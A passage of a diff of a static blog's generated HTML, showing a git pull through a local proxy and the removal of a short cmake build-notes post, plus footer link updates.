class="line">/data/Download/backup/myinv$ git checkout</span><br><span class="line">您的分支落后 'origin/master' 共 1 个提交，并且可以快进。</span><br><span class="line">  （使用 "git pull" 来更新您的本地分支）</span><br><span class="line"></span><br><span class="line">/data/Download/backup/myinv$ git pull</span><br><span class="line">|DNS-request| github.com</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:2080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| github.com is 13.229.188.59</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:2080-&lt;&gt;&lt;&gt;-13.229.188.59:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">更新 a69c9af..0447f8f</span><br><span class="line">Fast-forward</span><br><span class="line"> myinventory.trln | 31 +++++++++++++++++++++++++++++++</span><br><span class="line"> 1 file changed, 31 insertions(+)</span><br><span class="line"></span><br><span class="line">/data/Download/backup/myinv$ git checkout</span><br><span class="line">您的分支与上游分支 'origin/master' 一致。</span><br></pre></td></tr></table></figure>
 <p>注:<strong>推荐使用Visual Studio Code可以简化操作</strong></p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2018/02/27/cmake/">
-                cmake notes
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2018-02-27</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="cmake-notes"><a href="#cmake-notes" class="headerlink" title="cmake notes"></a>cmake notes</h1><h2 id="generate-Makefile-and-related-files-in-a-single-build-folder"><a href="#generate-Makefile-and-related-files-in-a-single-build-folder" class="headerlink" title="generate Makefile and related files in a single build folder"></a>generate Makefile and related files in a single <code>build</code> folder</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
-<h2 id="install-cmake-on-ubuntu"><a href="#install-cmake-on-ubuntu" class="headerlink" title="install cmake on ubuntu"></a>install cmake on ubuntu</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install cmake</span><br></pre></td></tr></table></figure>
         </div>
     
 
@@ -647,6 +674,10 @@
         <ul>
             
             <li>
+                <a class="footer-post" href="/2020/05/13/sqlplus/">sqlplus</a>
+            </li>
+            
+            <li>
                 <a class="footer-post" href="/2020/05/12/trojan-gfw/">trojan-gfw</a>
             </li>
             
@@ -655,11 +686,7 @@
             </li>
             
             <li>
-                <a class="footer-post" href="/2019/04/23/lede-lubuntu-eeepc901/">lede_lubuntu_eeepc901</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2019/03/20/win10-explorer-sort-by-num/">win10_explorer_sort_by_nu</a>
+                <a class="footer-post" href="/2019/04/23/lede-lubuntu-eeepc901/">LEDE &amp; Lubuntu on eeepc90</a>
             </li>
             
         </ul>
